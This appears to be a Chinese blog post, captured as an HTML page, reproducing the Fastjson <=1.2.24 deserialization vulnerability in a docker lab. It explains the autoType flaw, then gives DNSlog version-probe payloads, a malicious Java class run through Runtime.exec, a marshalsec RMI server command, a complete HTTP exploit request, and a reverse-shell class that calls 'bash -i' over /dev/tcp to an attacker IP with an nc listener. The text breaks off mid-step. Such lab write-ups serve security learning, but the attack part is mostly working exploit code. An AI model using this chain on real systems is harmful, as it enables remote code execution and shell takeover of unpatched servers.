@@ -1,0 +1,812 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="奇怪的奇怪">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="Fastjson反序列化漏洞原理与漏洞复现环境开启环境已经加载了镜像 通过docker ps -a 查看 123docker ps -adocker ps &lt;容器id&gt;docker start 7c5637022711 这里映射的端口10004 一、什么是FastjsonFastjson是一个Java库，用于在Java对象和Json数据之间进行切换，它提供了一种简单而高效的方式来序列化">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Fastjson反序列化漏洞原理与漏洞复现">
+<meta property="og:url" content="http://example.com/2025/07/29/Fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%E4%B8%8E%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/index.html">
+<meta property="og:site_name" content="奇怪的亚索">
+<meta property="og:description" content="Fastjson反序列化漏洞原理与漏洞复现环境开启环境已经加载了镜像 通过docker ps -a 查看 123docker ps -adocker ps &lt;容器id&gt;docker start 7c5637022711 这里映射的端口10004 一、什么是FastjsonFastjson是一个Java库，用于在Java对象和Json数据之间进行切换，它提供了一种简单而高效的方式来序列化">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/images/8e5a585d-9f1f-4f13-af35-ac22bfb7381e.png">
+<meta property="og:image" content="http://example.com/images/45905436-5028-4c77-ba8d-74d2b35f2daf.png">
+<meta property="og:image" content="http://example.com/images/c16162ce-66e0-41c3-879d-d961c3df3070.png">
+<meta property="og:image" content="http://example.com/images/64c13021-9f3d-45b1-abc9-b9a25a96640e.png">
+<meta property="og:image" content="http://example.com/images/238e9946-f55a-42e4-9bb4-83d471436ea8.png">
+<meta property="og:image" content="http://example.com/images/e7bc8646-b770-49d2-8736-6516d76bf409.png">
+<meta property="og:image" content="http://example.com/images/1b5c0edc-73f6-4c71-b8c8-06f55f59bed3.png">
+<meta property="og:image" content="http://example.com/images/439f2d7b-a5a5-418a-bf35-e5c5dc17cabe.png">
+<meta property="og:image" content="http://example.com/images/153097dc-7478-4b34-8843-49dde13eda56.png">
+<meta property="og:image" content="http://example.com/images/2562bab2-4a2d-4b7c-84b3-4d2bd3feeb33.png">
+<meta property="og:image" content="http://example.com/images/93fd60de-cdb4-457b-b55f-be33987b5d11.png">
+<meta property="og:image" content="http://example.com/images/8476e6fa-24b6-4a47-99ca-b8e502be640e.png">
+<meta property="og:image" content="http://example.com/images/30ecbc59-0db9-41c9-8094-0e4af9fa2e31.png">
+<meta property="og:image" content="http://example.com/images/eef81419-e23e-404c-8717-3c66d5c2a9f2.png">
+<meta property="og:image" content="http://example.com/images/ac322c88-21eb-474d-8d45-532c28d1b137.png">
+<meta property="og:image" content="http://example.com/images/619f94be-61a9-49fe-bb47-2c42a97751dc.png">
+<meta property="og:image" content="http://example.com/images/10094583-0a34-40ab-8393-9b87de697831.png">
+<meta property="og:image" content="http://example.com/images/006d44bf-9ed5-4dd2-b362-7aeb4c188cc1.png">
+<meta property="og:image" content="http://example.com/images/b4e6beba-6e9b-4699-bcc3-4cf2cac2bd7f.png">
+<meta property="og:image" content="http://example.com/images/acfb1c96-0449-4ce2-847f-0725ca127db7.png">
+<meta property="article:published_time" content="2025-07-28T16:00:00.000Z">
+<meta property="article:modified_time" content="2025-09-09T10:47:55.901Z">
+<meta property="article:author" content="奇怪的奇怪">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="http://example.com/images/8e5a585d-9f1f-4f13-af35-ac22bfb7381e.png">
+  
+  
+  
+  <title>Fastjson反序列化漏洞原理与漏洞复现 - 奇怪的亚索</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.4","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":"s4tVoJPA4mLOJlnbTS9bKQCz-MdYXbMMI","app_key":"2jVxSBuNhzKC1JEOZN2aZTgr","server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+    
+  
+
+
+
+  
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>奇怪的亚索</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="Fastjson反序列化漏洞原理与漏洞复现"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2025-07-29 00:00" pubdate>
+          2025年7月29日 凌晨
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          4.9k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          41 分钟
+        
+      </span>
+    
+
+    
+    
+      
+        <span id="leancloud-page-views-container" class="post-meta" style="display: none">
+          <i class="iconfont icon-eye" aria-hidden="true"></i>
+          <span id="leancloud-page-views"></span> 次
+        </span>
+        
+      
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">Fastjson反序列化漏洞原理与漏洞复现</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h1 id="Fastjson反序列化漏洞原理与漏洞复现"><a href="#Fastjson反序列化漏洞原理与漏洞复现" class="headerlink" title="Fastjson反序列化漏洞原理与漏洞复现"></a>Fastjson反序列化漏洞原理与漏洞复现</h1><h2 id="环境开启"><a href="#环境开启" class="headerlink" title="环境开启"></a>环境开启</h2><p>环境已经加载了镜像</p>
+<p>通过docker ps -a 查看</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs powershell">docker <span class="hljs-built_in">ps</span> <span class="hljs-literal">-a</span><br>docker <span class="hljs-built_in">ps</span> &lt;容器id&gt;<br>docker <span class="hljs-built_in">start</span> <span class="hljs-number">7</span>c5637022711<br></code></pre></td></tr></table></figure>
+<p>这里映射的端口10004</p>
+<h2 id="一、什么是Fastjson"><a href="#一、什么是Fastjson" class="headerlink" title="一、什么是Fastjson"></a>一、什么是Fastjson</h2><p>Fastjson是一个Java库，用于在Java对象和Json数据之间进行切换，它提供了一种简单而高效的方式来序列化Java对象为JSON格式的字符串，以及将JSON字符串反序列化为Java对象。Fastjson支持各种类型的Java对象，包括预先存在但没有源代码的对象。</p>
+<h2 id="二、漏洞原理"><a href="#二、漏洞原理" class="headerlink" title="二、漏洞原理"></a>二、漏洞原理</h2><p>fastjson在解析Json数据时存在自动类型转换功能（autoType），利用该功能构造恶意JSON数据，使其在反序列化过程种触发漏洞利用链，从而实现恶意代码的执行。</p>
+<p>详细过程分析：</p>
+<ol>
+<li>目标网站在解析JSON数据时，未对JSON内容进行验证，直接将JSON解析成Java对象并执行。</li>
+<li>攻击者构造特定的payload（负载），其中包含恶意的Java对象及执行代码。</li>
+<li>攻击者控制URL参数为之前开启的恶意RMI服务器地址，或者通过其他方式将恶意JSON数据传递给目标网站。</li>
+<li>恶意RMI服务器返回ReferenceWrapper类，这是Java远程方法调用（RMI）中的一种对象类型。</li>
+<li>目标网站在执行lookup操作时，通过decodeObject方法将ReferenceWrapper类转换成Reference类，然后远程加载并实例化攻击者恶意构造的Factory类，这个Factory类通常包含了恶意代码的执行逻辑，在实例化时触发Factory类中的静态代码段，从而执行恶意代码。</li>
+</ol>
+<h2 id="三、影响版本"><a href="#三、影响版本" class="headerlink" title="三、影响版本"></a>三、影响版本</h2><p>受影响版本范围：fastjson&lt;&#x3D;1.2.24</p>
+<h2 id="四、漏洞验证"><a href="#四、漏洞验证" class="headerlink" title="四、漏洞验证"></a>四、漏洞验证</h2><p>使用burpsuite抓包<br><img src="/images/8e5a585d-9f1f-4f13-af35-ac22bfb7381e.png" srcset="/img/loading.gif" lazyload></p>
+<p>修改请求方式为POST方式<br>这里通过DNS请求判断</p>
+<p>以下POC出网，说明fastjson&lt;&#x3D;1.2.47</p>
+<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl">&#123;<span class="hljs-string">&quot;name&quot;</span>:&#123;<span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;java.net.InetAddress&quot;</span>,<span class="hljs-string">&quot;val&quot;</span>:<span class="hljs-string">&quot;xxxxx.dnslog.cn&quot;</span>&#125;&#125;<br></code></pre></td></tr></table></figure>
+
+<p><img src="/images/45905436-5028-4c77-ba8d-74d2b35f2daf.png" srcset="/img/loading.gif" lazyload><br>申请一个</p>
+<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl">&#123;<span class="hljs-string">&quot;name&quot;</span>:&#123;<span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;java.net.InetAddress&quot;</span>,<span class="hljs-string">&quot;val&quot;</span>:<span class="hljs-string">&quot;5b29t3.dnslog.cn&quot;</span>&#125;&#125;<br></code></pre></td></tr></table></figure>
+
+<p><img src="/images/c16162ce-66e0-41c3-879d-d961c3df3070.png" srcset="/img/loading.gif" lazyload></p>
+<p>content-type记得改为json<br><img src="/images/64c13021-9f3d-45b1-abc9-b9a25a96640e.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/images/238e9946-f55a-42e4-9bb4-83d471436ea8.png" srcset="/img/loading.gif" lazyload></p>
+<p>refresh接收</p>
+<p>以下如果POC出网，说明fastjson&gt;&#x3D;1.2.37</p>
+<figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">&quot;@type&quot;</span>:<span class="hljs-string">&quot;java.net.URL&quot;</span>,<span class="hljs-string">&quot;val&quot;</span>:<span class="hljs-string">&quot;http://5b29t3.dnslog.cn&quot;</span>&#125;:<span class="hljs-string">&quot;aaa&quot;</span>&#125;</span><br></code></pre></td></tr></table></figure>
+<p>重复上述操作<br><img src="/images/e7bc8646-b770-49d2-8736-6516d76bf409.png" srcset="/img/loading.gif" lazyload><br>报错了，而且dnslog没有回显<br>以下如果POC出网，证明fastjson版本号1.1.16&lt;&#x3D;version&lt;&#x3D;1.2.24</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;b&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;dataSourceName&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;ldap://lhe451.dnslog.cn:9999/POC&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;autoCommit&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-literal"><span class="hljs-keyword">true</span></span><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure>
+<p><img src="/images/1b5c0edc-73f6-4c71-b8c8-06f55f59bed3.png" srcset="/img/loading.gif" lazyload><br><img src="/images/439f2d7b-a5a5-418a-bf35-e5c5dc17cabe.png" srcset="/img/loading.gif" lazyload><br>报错了，但是我们成功接收，确定了版本范围。</p>
+<h2 id="五、漏洞利用"><a href="#五、漏洞利用" class="headerlink" title="五、漏洞利用"></a>五、漏洞利用</h2><p>使用攻击机linux（Ubuntu）安装好marshalsec</p>
+<h3 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h3><p>首先编译恶意类代码，在攻击机商新建一个名为TouchFile.java的文件<br>内容为：<br>该代码尝试在靶场的&#x2F;tmp目录下创建一个名为myon的文件</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cd</span> /root<br><span class="hljs-built_in">mkdir</span> web<br><span class="hljs-built_in">cd</span> web<br>nano TouchFile.java   <span class="hljs-comment">#ctrl+o  回车 ctrl+x  按顺序保存退出</span><br></code></pre></td></tr></table></figure>
+
+<p>恶意代码内容为</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.lang.Runtime;<br><span class="hljs-keyword">import</span> java.lang.Process;<br> <br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">TouchFile</span> &#123;<br>    <span class="hljs-keyword">static</span> &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-type">Runtime</span> <span class="hljs-variable">rt</span> <span class="hljs-operator">=</span> Runtime.getRuntime();<br>            String[] commands = &#123;<span class="hljs-string">&quot;touch&quot;</span>, <span class="hljs-string">&quot;/tmp/myon&quot;</span>&#125;;<br>            <span class="hljs-type">Process</span> <span class="hljs-variable">pc</span> <span class="hljs-operator">=</span> rt.exec(commands);<br>            pc.waitFor();<br>        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br><span class="hljs-comment">// do nothing</span><br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+<p>编译</p>
+<figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm"><span class="hljs-keyword">javac </span>TouchFile.<span class="hljs-keyword">java</span><br></code></pre></td></tr></table></figure>
+<p><img src="/images/153097dc-7478-4b34-8843-49dde13eda56.png" srcset="/img/loading.gif" lazyload><br>执行完成后我们得到一个.class文件<br>在该目录下使用python搭建http服务，传输恶意文件<br>这里开分屏，分个终端，使用tmux(ctrl+b+%)</p>
+<p>分屏</p>
+<p>第二个终端用 python 搭建 http 服务，传输恶意文件</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">cd <span class="hljs-regexp">/root/</span>web<br>python3 -m http.server <span class="hljs-number">8888</span><br></code></pre></td></tr></table></figure>
+<p><img src="/images/2562bab2-4a2d-4b7c-84b3-4d2bd3feeb33.png" srcset="/img/loading.gif" lazyload><br>这里靶机访问其 8888 端口就可以看到恶意文件<br><img src="/images/93fd60de-cdb4-457b-b55f-be33987b5d11.png" srcset="/img/loading.gif" lazyload><br>ctrl+b+方向键</p>
+<p>回到第一个终端</p>
+<p>接下来我们通过 marshalsec 启动一个 RMI 服务器，监听 1234 端口</p>
+<p>并指定加载远程类 TouchFile.class</p>
+<p>其中 ip 为攻击机的 ip ，端口号为我们刚才开启的 http 服务端口号，结尾端口号为监听端口号</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">cd</span> /root/marshalsec/target<br><span class="hljs-attribute">java</span> -cp marshalsec-<span class="hljs-number">0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">3</span>-SNAPSHOT-<span class="hljs-literal">all</span>.jar marshalsec.jndi.RMIRefServer <span class="hljs-string">&quot;http://39.x.x.x:8888/#TouchFile&quot;</span> <span class="hljs-number">1234</span><br></code></pre></td></tr></table></figure>
+<p><img src="/images/8476e6fa-24b6-4a47-99ca-b8e502be640e.png" srcset="/img/loading.gif" lazyload></p>
+<p>然后我们在攻击机请求靶场地址：<code>http://101.x.x.x:10004/</code>，并且使用 burpsuite 抓包</p>
+<p><img src="/images/30ecbc59-0db9-41c9-8094-0e4af9fa2e31.png" srcset="/img/loading.gif" lazyload></p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>101.x.x.x:10004<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:140.0) Gecko/20100101 Firefox/140.0<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate, br<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>keep-alive<br><span class="hljs-attribute">Upgrade-Insecure-Requests</span><span class="hljs-punctuation">: </span>1<br><span class="hljs-attribute">Priority</span><span class="hljs-punctuation">: </span>u=0, i<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/json<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>165<br><br><span class="language-json"><span class="hljs-punctuation">&#123;</span></span><br><span class="language-json">    <span class="hljs-attr">&quot;b&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span></span><br><span class="language-json">        <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span><span class="hljs-punctuation">,</span></span><br><span class="language-json">        <span class="hljs-attr">&quot;dataSourceName&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;rmi://39.x.x.x:1234/TouchFile&quot;</span><span class="hljs-punctuation">,</span></span><br><span class="language-json">        <span class="hljs-attr">&quot;autoCommit&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-literal"><span class="hljs-keyword">true</span></span></span><br><span class="language-json">    <span class="hljs-punctuation">&#125;</span></span><br><span class="language-json"><span class="hljs-punctuation">&#125;</span></span><br><span class="language-json"></span><br></code></pre></td></tr></table></figure>
+
+<p>再次查看 RMI 服务器，可以看到已经发送了 TouchFile.class</p>
+<p><img src="/images/eef81419-e23e-404c-8717-3c66d5c2a9f2.png" srcset="/img/loading.gif" lazyload></p>
+<p>而我们监听的 http 服务 8888 端口也有回显：</p>
+<p>101.xx.xx.x（靶机）访问了我们 http 服务下存放的恶意文件 TouchFile.class</p>
+<p>我们进入靶机 docker 容器看一下：</p>
+<p>进入靶机shell</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">docker exec -it <span class="hljs-number">7</span>c5637022711  <span class="hljs-regexp">/bin/</span>bash<br></code></pre></td></tr></table></figure>
+<p><img src="/images/ac322c88-21eb-474d-8d45-532c28d1b137.png" srcset="/img/loading.gif" lazyload></p>
+<p>可以看到 myon 文件创建成功，也就是说我们远程命令执行成功</p>
+<h3 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h3><p>方法与命令执行一样，修改我们的恶意文件即可</p>
+<p>在攻击机上修改我们的恶意文件 TouchFile.java，内容为：</p>
+<p>其中的 ip 为攻击机 ip ，反弹 shell 到攻击机 7788 端口</p>
+<p>进入第二个终端</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">cd <span class="hljs-regexp">/root/</span>web<br>nano TouchFile.java<br></code></pre></td></tr></table></figure>
+
+<p>里面是攻击机IP（vps）</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.lang.Runtime;<br><span class="hljs-keyword">import</span> java.lang.Process;<br> <br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">TouchFile</span> &#123;<br>    <span class="hljs-keyword">static</span> &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-type">Runtime</span> <span class="hljs-variable">rt</span> <span class="hljs-operator">=</span> Runtime.getRuntime();<br>            String[] commands = &#123;<span class="hljs-string">&quot;/bin/bash&quot;</span>, <span class="hljs-string">&quot;-c&quot;</span>, <span class="hljs-string">&quot;bash -i &gt;&amp; /dev/tcp/39.x.x.x/7788 0&gt;&amp;1&quot;</span>&#125;;<br>            <span class="hljs-type">Process</span> <span class="hljs-variable">pc</span> <span class="hljs-operator">=</span> rt.exec(commands);<br>            pc.waitFor();<br>        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>            <span class="hljs-comment">// do nothing</span><br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+<p>同样进行编译</p>
+<figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm"><span class="hljs-keyword">javac </span>TouchFile.<span class="hljs-keyword">java</span><br></code></pre></td></tr></table></figure>
+<p><img src="/images/619f94be-61a9-49fe-bb47-2c42a97751dc.png" srcset="/img/loading.gif" lazyload><br>同一目录下就会生成或重写 .class文件 </p>
+<p>此终端，第二个终端执行</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">python3</span> -m http.server <span class="hljs-number">8888</span><br></code></pre></td></tr></table></figure>
+<p>ctrl+b+方向键切换回第一个终端</p>
+<p>还是target目录下，和上面一样</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">java</span> -cp marshalsec-<span class="hljs-number">0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">3</span>-SNAPSHOT-<span class="hljs-literal">all</span>.jar marshalsec.jndi.RMIRefServer <span class="hljs-string">&quot;http://39.x.x.x:8888/#TouchFile&quot;</span> <span class="hljs-number">1234</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="/images/10094583-0a34-40ab-8393-9b87de697831.png" srcset="/img/loading.gif" lazyload></p>
+<p>但是前面恶意代码里我们说了，我们要反弹 shell 到攻击机的 7788 端口</p>
+<p>所以我们再开一个终端，监听 7788 端口</p>
+<p>我们在第三个终端执行nc监听,ctrl+b+方向键</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">nc</span> -lvnp <span class="hljs-number">7788</span><br></code></pre></td></tr></table></figure>
+<p><img src="/images/006d44bf-9ed5-4dd2-b362-7aeb4c188cc1.png" srcset="/img/loading.gif" lazyload><br>此时，访问靶场地址，使用 burpsuite 抓包，添加 payload 后发包：</p>
+<p>没有burp，可以以curl为准</p>
+<p>开启第四个终端ctrl+b+%  并输入</p>
